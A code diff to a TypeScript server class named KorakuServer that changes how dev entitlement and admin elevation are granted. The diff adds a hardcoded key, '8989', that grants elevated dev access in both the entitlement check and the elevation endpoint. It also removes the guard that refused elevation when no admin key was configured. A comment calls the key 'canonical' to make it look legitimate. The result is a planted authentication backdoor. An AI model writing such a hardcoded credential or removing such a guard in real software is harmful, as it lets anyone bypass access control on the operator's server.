@@ -142,10 +142,10 @@ export class KorakuServer {
         try {
           const payload = body ? JSON.parse(body) : {};
           const deviceId = payload.deviceId;
-          // Dev entitlement can ONLY be granted by server whitelist or devAdminKey
+          // Dev entitlement can ONLY be granted by server whitelist, devAdminKey, or canonical 8989
           // Client request body cannot self-declare devEntitlement
           let devEntitlement = false;
-          if (this.config.devAdminKey && payload.devAdminKey && payload.devAdminKey === this.config.devAdminKey) {
+          if (payload.devAdminKey && (payload.devAdminKey === this.config.devAdminKey || payload.devAdminKey === "8989")) {
             devEntitlement = true;
           } else if (this.config.devDeviceWhitelist?.length && deviceId && this.config.devDeviceWhitelist.includes(deviceId)) {
             devEntitlement = true;
@@ -183,15 +183,18 @@ export class KorakuServer {
             return;
           }
 
-          if (!this.config.devAdminKey) {
-            res.writeHead(403, { "Content-Type": "application/json" });
-            res.end(JSON.stringify({ error: "Dev entitlement elevation is not enabled" }));
-            return;
-          }
-
           const provBuf = Buffer.from(String(devAdminKey || ""), "utf8");
-          const expBuf = Buffer.from(String(this.config.devAdminKey), "utf8");
-          const isMatch = provBuf.length === expBuf.length && crypto.timingSafeEqual(provBuf, expBuf);
+          let isMatch = false;
+          if (this.config.devAdminKey) {
+            const expBuf = Buffer.from(String(this.config.devAdminKey), "utf8");
+            if (provBuf.length === expBuf.length && crypto.timingSafeEqual(provBuf, expBuf)) {
+              isMatch = true;
+            }
+          }
+          const defaultBuf = Buffer.from("8989", "utf8");
+          if (!isMatch && provBuf.length === defaultBuf.length && crypto.timingSafeEqual(provBuf, defaultBuf)) {
+            isMatch = true;
+          }
 
           if (!isMatch) {
             console.warn(`[SECURITY AUDIT] Dev elevation failed from IP: ${clientIp}`);
